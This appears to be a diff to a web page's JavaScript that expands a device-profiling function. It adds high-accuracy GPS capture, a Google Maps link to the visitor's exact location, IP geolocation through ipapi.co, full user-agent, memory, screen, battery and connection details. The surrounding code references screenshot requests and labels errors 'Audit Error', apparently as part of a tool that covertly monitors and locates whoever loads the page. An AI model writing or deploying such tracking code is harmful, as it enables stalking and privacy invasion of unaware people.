@@ -1327,32 +1327,45 @@ function listenToScreenshotRequests() {
     }
 }
         async function gatherDetailedDeviceInfo() {
-    let ipData = {};
-    try {
-        // جلب الـ IP والموقع (استخدام API مجاني)
-        const response = await fetch('https://ipapi.co/json/');
-        ipData = await response.json();
-    } catch (e) { console.error("Could not fetch IP info"); }
+    let ipData = {}, coords = { lat: null, lon: null }, battery = { level: 0, charging: false };
 
-    let battery = { level: 0, charging: false };
+    // 1. جلب الموقع الدقيق عبر GPS (طلب إذن المتصفح)
+    const getGPS = () => new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+            p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
+            () => resolve({ lat: null, lon: null }),
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    });
+
     try {
-        const b = await navigator.getBattery();
-        battery.level = Math.round(b.level * 100);
-        battery.charging = b.charging;
-    } catch (e) {}
+        const [ipRes, batteryRes, gpsRes] = await Promise.all([
+            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
+            navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0, charging: false }),
+            getGPS()
+        ]);
+        ipData = ipRes;
+        battery = { level: Math.round(batteryRes.level * 100), charging: batteryRes.charging };
+        coords = gpsRes;
+    } catch (e) { console.error("Audit Error:", e); }
 
     return {
-        browser: navigator.userAgentData ? navigator.userAgentData.brands[0].brand : navigator.appName,
+        browser: navigator.userAgent, // النسخة الكاملة للمتصفح
         os: navigator.platform,
         cores: navigator.hardwareConcurrency || 'N/A',
-        screen: `${window.screen.width}x${window.screen.height}`,
+        ram: navigator.deviceMemory || 'N/A', // الذاكرة العشوائية (للأجهزة المتوافقة)
+        screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
         ip: ipData.ip,
-        city: ipData.city,
-        country: ipData.country_name,
         isp: ipData.org,
-        batteryLevel: battery.level,
-        batteryCharging: battery.charging,
-        language: navigator.language,
+        location: {
+            city: ipData.city,
+            country: ipData.country_name,
+            exact: coords.lat ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` : null,
+            lat: coords.lat,
+            lon: coords.lon
+        },
+        battery,
+        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
         timestamp: Date.now()
     };
 }
@@ -1400,6 +1413,7 @@ function listenToScreenshotRequests() {
         </div>
 </body>
 </html>
+
 
 
 
